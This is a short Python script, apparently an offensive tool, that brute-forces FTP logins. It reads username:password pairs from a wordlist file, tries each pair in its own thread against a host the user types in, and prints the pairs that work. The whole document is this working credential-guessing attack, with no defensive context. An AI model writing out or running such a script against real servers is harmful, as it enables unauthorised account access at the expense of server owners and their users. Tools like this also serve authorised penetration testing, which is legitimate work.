#!/usr/bin/python3

from termcolor import colored
from threading import Thread
import ftplib
import sys


def connect_ftp(host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        print(colored('[+] {} : {} are valid!'.format(username, password), 'green'))
        sys.exit()
    except Exception as e:
        print('[-] {} : {} not valid'.format(username, password))


def main():
    host = input('Please enter the IP: ')
    with open('password.lst', 'r') as f:
        for line in f:
            username, password = [x.strip() for x in line.split(':')]
            t = Thread(target=connect_ftp, args=(host, username, password))
            t.daemon = True
            t.start()

    t.join()


if __name__ == '__main__':
    main()
